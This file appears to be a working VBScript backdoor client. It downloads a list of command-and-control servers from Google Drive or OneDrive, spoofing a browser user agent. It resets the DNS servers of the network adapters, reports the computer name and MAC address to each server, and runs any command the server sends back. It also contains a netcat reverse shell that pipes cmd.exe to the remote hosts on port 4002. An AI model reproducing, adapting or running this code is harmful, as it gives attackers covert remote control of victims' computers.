On Error Resume Next
set xmlhttp = createobject ("Msxml2.ServerXMLHTTP")
dim url,mac
  'url="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/"
  'url="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF"
  url="https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny"
  'url="https://onedrive.live.com/download.aspx?cid=7C80BDF021F1D245&authKey=%21AK7fmy%5FJWYJYexo&resid=7C80BDF021F1D245%213188&ithint=%2Etxt"
'msgbox  url&"site.txt"
'xmlhttp.open "get", url&"site.txt", false

xmlhttp.open "get", url, false

xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
xmlhttp.send
strOutput = xmlhttp.responseText
if (left(strOutput,6)="<HTML>") then
    url="https://onedrive.live.com/download.aspx?cid=7C80BDF021F1D245&authKey=%21AK7fmy%5FJWYJYexo&resid=7C80BDF021F1D245%213188&ithint=%2Etxt"
    xmlhttp.open "get", url, false

    xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
    xmlhttp.send
    strOutput = xmlhttp.responseText
end if
'msgbox strOutput
a=Split(strOutput,",")
Set oShell = CreateObject ("WScript.Shell") 
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputerName & "\root\cimv2")

Set colAdapters = objWMIService.ExecQuery _
    ("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
for each nad in colAdapters
    If Not IsNull(Nad.DefaultIPGateway) Then
      if not isnull(Nad.MACAddress) then
       mac=Nad.MACAddress 'Wscript.Echo Nad.description, Nad.MACAddress 
       arrDNSServers = Array("8.8.8.8", "8.8.8.8")
        nad.SetDNSServerSearchOrder(arrDNSServers)
      end if
    end if  
next 
Set colItems = objWMIService.ExecQuery("Select * From Win32_Process where name='nc64.exe'")
'msgbox colitems
dim brun
'brun=true
For Each objItem in colItems
    'msgbox objItem.name & " " & objItem.ProcessID & " " & objItem.CommandLine
    'If objItem.name = "Calculator.exe" then objItem.terminate
    brun=false
Next
dim arr
  for each x in a
      'msgbox x
      
      'Wscript.Echo "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac
      
      'xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac, false
      xmlhttp.open "get", x&"/svc/wup.php?pc="&strComputerName&"_"&mac, false
      xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"  
      xmlhttp.send
      strOutput = xmlhttp.responseText
      arr=Split(strOutput,"||")
      'Wscript.Echo strOutput
      if (right(arr(7),1)=1) then
        msgbox right(arr(8),len(arr(8))-4)
        oShell.run right(arr(8),len(arr(8))-4)
          
        xmlhttp.open "get", x&"/svc/wup.php?pc="&strComputerName&"_"&mac&"&exec=0", false
        xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"
        xmlhttp.send
      end if
      if brun then
        oShell.run "nc64.exe -d -w 10 -e cmd.exe "&x&" 4002"
        
      end if
      WScript.Sleep 100
      
  next
rem oShell.run "taskkill /f /im wscript.exe"
'dim WMI:  set WMI = GetObject("winmgmts:\\.\root\cimv2")
'dim Nads: set Nads = WMI.ExecQuery("Select * from Win32_NetworkAdapter where physicaladapter=true") 
'dim nad



'strOutput = split(xmlhttp.responseText,"Stable release</a>")(1)
'strOutput = split(strOutput,"<small>")(0)
'strOutput = replace(replace(strOutput,vbcr,""),vblf,"")
'strOutput = split(strOutput,"<p>")(1)

'msgbox "Version: " & strOutput